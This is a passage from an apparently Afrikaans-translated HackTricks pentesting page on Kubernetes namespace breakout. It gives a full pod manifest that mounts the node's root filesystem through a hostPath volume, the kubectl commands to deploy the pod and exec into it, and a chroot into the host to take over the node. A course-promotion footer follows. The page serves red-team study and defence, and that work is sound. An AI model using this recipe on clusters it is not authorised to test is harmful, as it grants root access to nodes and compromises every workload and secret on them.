kubectl get pod <name> [-n <namespace>] -o yaml
```
> as jy 'n pod op 'n spesifieke node wil skep, kan jy die volgende bevel gebruik om etikette op die node te kry
>
> `k get nodes --show-labels`
>
> Gewoonlik is kubernetes.io/hostname en node-role.kubernetes.io/master albei goeie etiket vir seleksie.
>
> [verwysing]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Dan skep jy jou attack.yaml l√™er
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[oorpronklike yaml bron](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Daarna skep jy die houer
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Nou kan jy oorskakel na die geskepte houer soos volg:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
En uiteindelik chroot jy in die stelsel van die node in
```bash
chroot /root /bin/bash
```
Inligting verkry van: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Deel 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Aanval en Verdediging van Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Verwysings

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
